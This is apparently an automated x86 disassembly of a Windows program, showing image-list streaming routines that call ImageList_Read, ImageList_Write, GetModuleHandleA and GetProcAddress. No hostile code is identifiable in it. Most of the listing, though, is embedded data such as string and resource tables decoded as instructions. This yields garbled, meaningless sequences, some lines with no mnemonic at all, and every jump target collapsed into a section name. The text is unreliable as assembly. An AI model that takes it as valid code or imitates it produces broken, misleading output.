mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_445c4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446b43
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub eax 0xffffffec
sub_446b43
mov eax [ ebp - 0x4 ]
call sub_445b3c
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_446c72
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41540c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_415b14
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41540c
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403258
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41540c
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419c58
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_446c55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41540c
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_445c4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41540c
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_446ca4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_445cdc
mov eax edi
call sub_4153ec
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41540c
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_446848
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_446adc
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_446d30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_419c58
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_446e2a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40bad4
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_445c78
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_445c78
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446e31
mov eax [ ebp - 0x4 ]
call sub_403258
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
jmp r-xdata
sub_446e98
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
mov edx esi
call sub_446608
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_446ee4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_446f09
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446f10
retn
sub_447360
clc
push edx
push ecx
inc [ eax - 0x52 ]
inc esp
add [ eax - 0x58 ] al
inc esp
add [ eax ] dl
test eax 0xa9480044
inc esp
add [ eax - 0x63ffbb53 ] dh
lodsd [ esi ]
inc esp
add [ esi + 0x54090044 ] bl
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc ebx
push 0x606b6365
jno r-xdata
arpl [ ebx + 0x60 ] bp
insd
nop
jae r-xdata
add [ eax ] al
push [ edi + 0x44 ]
imul ebp [ edi + 0x6e ] r-xdata
outsb
push edx
jne r-xdata
add [ ebx ] bh
add [ eax ] al
call eax
mov eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
dec ebp
je r-xdata
je r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
adc [ eax ] al
cmp eax 0x14ff0000
scasb [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0xa86d6574
push cs
dec ecx
outsb
js r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
insd
popad
jae r-xdata
popa
outsd
cmp [ eax ] al
add bh bh
and [ edi - 0x505bffbc ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
imul esi [ ebp + ebp * 2 + 0x61 ] 0x446f7470
add [ eax ] cl
add bh bh
mov al [ 0x10044a6 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
outsd
outsb
jne r-xdata
imul edx [ eax + edx + 0x300040 ] 0x0
push [ eax - 0x7bffbb5a ]
scasd [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jns r-xdata
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
insd
hlt
add al 0x48
inc esp
add [ eax + esi * 4 + 0x44 ] al
add [ eax ] al
add [ eax - 0x1 ] al
adc [ eax ] al
or cl [ ecx + 0x6d ]
popad
push cs
inc ecx
add [ eax + eax ] dl
call [ eax + eax ]
inc [ eax + esi * 4 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
jne r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
push 0x10044a9
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
js r-xdata
je r-xdata
popad
jo r-xdata
add bh bh
mov al 0xa6
inc esp
add [ edi + ebp * 4 + 0x44 ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
pop es
inc ebx
pushad
jno r-xdata
cwde
inc ebx
jne r-xdata
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
inc esp
mov al 0x44
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
jmp [ eax + 0x240044a8 ]
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
in al 0xaf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
adc [ eax ] al
cmp [ eax ] eax
add bh bh
je r-xdata
inc edx
add [ eax + eax ] bh
add bh bh
dec esp
mov edx 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
add eax 0x75411100
je r-xdata
inc ecx
add al dl
cwde
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
call [ eax + 0x640044a8 ]
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xc0656c62
push cs
inc ecx
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ eax + esi * 4 + 0x44 ]
add [ eax - 0x80000000 ] al
adc al 0x0
pop es
dec edi
outsb
inc ebx
insb
outsd
dec ecx
je r-xdata
pushad
pop ecx
inc esp
add [ eax + eax ] bh
push [ eax - 0x4f ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530d000a ] al
jne r-xdata
arpl [ gs : ebx + 0x65 ] bp
add ah al
scasd [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
inc esp
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
jmp [ eax ]
outsb
cld
mov dl 0x41
add [ esp + ebp * 4 - 0x52c3ffbc ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
inc ecx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor al 0x40
add [ eax ] dl
xchg edx eax
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
inc ecx
add [ eax ] ah
add bh bh
jl r-xdata
insd
test al 0xe
add [ esi + 0x77 ] ah
inc esp
je r-xdata
add [ eax + 0x3d ] dl
inc ecx
add [ eax - 0x3d ] bh
inc esp
add [ esp + eax * 8 ] dl
add [ edi + esi * 2 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ 0x654d6e4f ] cl
popad
jae r-xdata
je r-xdata
inc esp
add [ esi + edi ] dh
inc ecx
add ah al
xchg esp eax
inc ecx
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x45 ] dl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
insd
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
add [ esi + edx * 4 - 0x6717ffbf ] ah
add [ edx + 0x77 ] bh
inc esp
add [ eax ] bl
add [ eax ] al
js r-xdata
inc ecx
add al dh
cwde
inc ecx
add [ edx + edi * 4 - 0x3c9fffbc ] dh
inc esp
add [ ebx + edi * 4 - 0x3c6fffbc ] ah
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
mov esp 0xb4004195
xchg ebp eax
jb r-xdata
push esp
ja r-xdata
insd
js r-xdata
inc esp
add [ ebp + edx * 4 - 0x695bffbf ] ch
inc ecx
add al ch
cwde
dec ecx
je r-xdata
add [ eax ] al
ja r-xdata
add [ eax ] al
inc esp
add [ eax - 0x67010000 ] bl
xchg ebp eax
inc ecx
insd
lea eax [ eax ]
sbb [ edi + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x44 ] dl
sub_4477c4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
js r-xdata
add [ eax - 0x3d ] bh
inc esp
add [ esp + eax * 8 ] dl
inc esp
add [ ebp + edx * 4 - 0x695bffbf ] ch
inc ecx
add al ch
cwde
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
inc ecx
add [ edx + edi * 4 - 0x3c9fffbc ] dh
inc esp
add [ eax - 0x37 ] dl
inc esp
add [ eax + ecx * 8 + 0x54090044 ] dl
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
rcr [ eax + 0x78 ] 0x44
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0xc756e65
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x78 ] cl
inc esp
add [ eax ] ah
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
add [ eax + 0xb004477 ] al
add [ 0x756e654d ] al
jae r-xdata
dec ecx
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
push [ eax + ecx * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
add [ eax + ecx * 8 + 0x44 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax + 0x34004471 ] ch
enter 0x44 0x44
enter 0x44 0x1
adc [ eax ] al
inc eax
add [ eax ] al
[ edx + eax * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
inc eax
add [ ecx ] al
add bh bh
rol bh 0x1
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
dec ebp
jb r-xdata
insd
popad
jae r-xdata
push es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
jb r-xdata
je r-xdata
outsb
je r-xdata
popad
js r-xdata
jns r-xdata
push esp
jb r-xdata
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
outsb
je r-xdata
ja r-xdata
and [ edx + 0x44 ] bh
add [ 0x654c616d ] cl
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x6004479 ] ah
inc ebx
push 0x65676e61
nop
movsb [ edi ] [ esi ]
jns r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb465646f
outsd
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
call eax
mov [ eax + eax + 0x1 ] 0x0
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6065646f
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080006 ] al
inc ecx
add [ eax ] dh
add [ eax ] al
pop ecx
inc esp
add [ eax ] cl
add bh bh
fadd st3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
pushad
test al 0x71
inc esp
add [ eax + ecx * 8 + 0x44 ] dl
add [ eax + ecx * 8 + 0x44 ] ah
add [ ecx ] al
add [ eax ] al
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
and al 0x7a
inc esp
jo r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
mov al [ 0x6004479 ]
jpe r-xdata
outsd
in al 0x79
inc esp
add [ ebx ] al
or al 0x54
dec ebp
outsb
jne r-xdata
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
or eax 0x6f42616d
insd
jo r-xdata
je r-xdata
je r-xdata
insd
popad
inc edx
outsd
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
[ eax ] eax
add [ ebp + 0x7af00040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
or [ eax + 0x61 ] dh
jo r-xdata
inc eax
add [ eax + 0x340044cf ] ch
inc ecx
add ah al
xchg esp eax
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ eax - 0x3d ] bh
inc esp
add [ esp + eax * 8 ] dl
inc esp
add [ ebp + edx * 4 - 0x695bffbf ] ch
inc ecx
add al ch
cwde
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
inc ecx
add [ edi + ecx * 8 ] dh
inc esp
add [ eax - 0x3d ] ah
inc esp
add [ ebx + edi * 4 - 0x3c6fffbc ] ah
inc esp
add ah bl
iretd
add [ edx + esi ] cl
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 ] dh
inc esp
add [ eax ] bh
add [ eax ] al
int3
outsd
inc edx
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al ah
jns r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
push esp
outsd
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
or al 0x32
inc eax
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
outsd
insd
je r-xdata
or eax 0x654c616d
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
outsd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
dec esp
je r-xdata
jpe r-xdata
je r-xdata
jne sub_447a8b
outsd
je r-xdata
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 + 0x44 ] al
add [ eax ] al
je r-xdata
outsd
dec esp
je r-xdata
outsb
add eax 0x756e654d
jae r-xdata
sub_447a8b
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
xor al 0x40
add [ eax ] dl
xchg edx eax
inc ecx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] esp
jpe r-xdata
or al 0x32
inc eax
add [ eax + 0x340044cf ] ch
inc ecx
add ah al
xchg esp eax
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ eax - 0x3d ] bh
inc esp
add [ esp + eax * 8 ] dl
inc esp
add [ ebp + edx * 4 - 0x695bffbf ] ch
inc ecx
add al ch
cwde
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
inc ecx
add [ edi + ecx * 8 ] dh
inc esp
add [ eax - 0x3d ] ah
inc esp
add [ ebx + edi * 4 - 0x3c6fffbc ] ah
inc esp
add ah bl
iretd
[ eax ] eax
add [ ebp + 0x7af00040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 ] dh
inc esp
add [ eax ] bh
add [ eax ] al
int3
sub_447b2e
inc esp
add [ eax + edx * 8 + 0x540a0044 ] dl
push eax
outsd
jo r-xdata
add [ eax + ecx * 8 + 0x44 ] dl
add [ eax + ecx * 8 + 0x44 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
add [ eax + ecx * 8 ] dh
inc esp
add [ eax + ecx * 8 + 0x44 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
dec eax
outsd
je r-xdata
rcr [ eax + 0x34940041 ] 0x1
inc eax
add [ eax ] dl
xchg edx eax
inc ecx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x340044cf ] ch
inc ecx
add ah al
xchg esp eax
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ eax - 0x3d ] bh
inc esp
add [ esp + eax * 8 ] dl
inc esp
add [ ebp + edx * 4 - 0x695bffbf ] ch
inc ecx
add al ch
cwde
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
inc ecx
add [ edi + ecx * 8 ] dh
inc esp
add [ eax - 0x3d ] ah
inc esp
add [ ebx + edi * 4 - 0x3c6fffbc ] ah
inc esp
add ah bl
iretd
inc esp
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
pushfd
retn 0x44
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
jno r-xdata
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
push cs
push eax
popad
jb r-xdata
call eax
mov [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pushad
pop ecx
inc esp
add [ eax ] cl
add bh bh
fadd st3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
or al [ eax ]
or eax 0x756e654d
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x300041
add bh bh
mov esp 0xb40044c7
rol [ eax + eax ] 0x0
add [ eax - 0x80000000 ] al
push cs
inc ecx
add al dh
iretd
push esp
test al 0x71
inc esp
outsb
push edx
jne r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x7e
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe065646f
jns r-xdata
inc ecx
je r-xdata
inc ebx
push 0x65676e61
ror [ esi ] 0x41
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ ecx ] cl
inc ecx
jne r-xdata
add [ esi ] al
jpe r-xdata
jo r-xdata
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
je r-xdata
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax ] dh
inc ecx
add ah dl
aaa
inc ecx
add [ ecx + edi + 0x36840041 ] bh
inc ecx
add [ eax ] al
aaa
inc ecx
add [ ecx + ecx * 8 + 0x540a0044 ] ch
push eax
outsd
jo r-xdata
rcl [ ebp + edi * 2 + 0x44 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1400447d ] ch
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
ror [ gs : 0x41 ] 0x70
add [ eax ] al
push [ eax ]
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ esp + edx + 0x41 ] al
outsb
mov ah 0x6f
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
outsd
jpo r-xdata
jpe r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43cb14
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
and [ edx ] eax
push cs
push esp
dec ebp
outsb
jne r-xdata
pop esp
and [ edx ] eax
shl [ ecx ] 0x42
add [ eax - 0x73ffbddf ] ah
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax ] bl
inc edx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ ecx + 0x42 ] bl
add al al
and [ edx ] eax
mov al [ 0xffffffff8c004221 ]
imul esi [ ebx + 0x74 ] 0x447e0090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x10004477 ] al
add [ 0x756e654d ] al
jae r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
test al 0x71
inc esp
add [ eax + 0x60004479 ] ah
